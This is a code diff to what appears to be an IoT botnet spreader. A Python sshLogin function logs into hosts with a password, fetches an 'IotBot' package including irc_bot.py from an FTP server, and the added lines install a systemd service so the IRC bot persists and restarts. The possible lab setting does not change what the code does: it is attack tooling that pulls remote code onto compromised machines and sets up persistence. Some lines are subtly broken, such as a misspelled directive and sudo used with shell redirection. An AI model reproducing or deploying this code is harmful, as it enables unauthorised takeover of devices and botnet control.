@@ -40,8 +40,20 @@ def sshLogin(user, ip, password):
         echo ''' + password + '''| sudo -S mkdir IotBot
         cd IotBot
         echo ''' + password + '''| sudo wget --user=user --password=abcd ftp://10.0.0.184:/IotBot/*
-        python3 irc_bot.py &
-        ls
+        
+        echo ''' + password + '''| sudo touch /etc/systemd/system/my.service
+        echo ''' + password + '''| sudo echo '[Unit]' >> /etc/systemd/system/my.service
+        echo ''' + password + '''| sudo echo 'Description=A test unit' >> /etc/systemd/system/my.service
+        
+        echo ''' + password + '''| sudo echo '' >> /etc/systemd/system/my.service
+        echo ''' + password + '''| sudo echo '[Service]' >> /etc/systemd/system/my.service
+        echo ''' + password + '''| sudo echo 'ExecStart=/usr/bin/python3 /home/kabali/IotBot/irc_bot.py' >> /etc/systemd/system/my.service
+        echo ''' + password + '''| sudo echo 'StandardOutput=syslog' >> /etc/systemd/system/my.service
+        echo ''' + password + '''| sudo echo 'tandardError=syslog' >> /etc/systemd/system/my.service
+        echo ''' + password + '''| sudo echo 'SyslogIdentifier=my' >> /etc/systemd/system/my.service
+        
+        echo ''' + password + '''| sudo systemctl start my
+        echo ''' + password + '''| sudo systemctl status my
         exit
         '''
         )
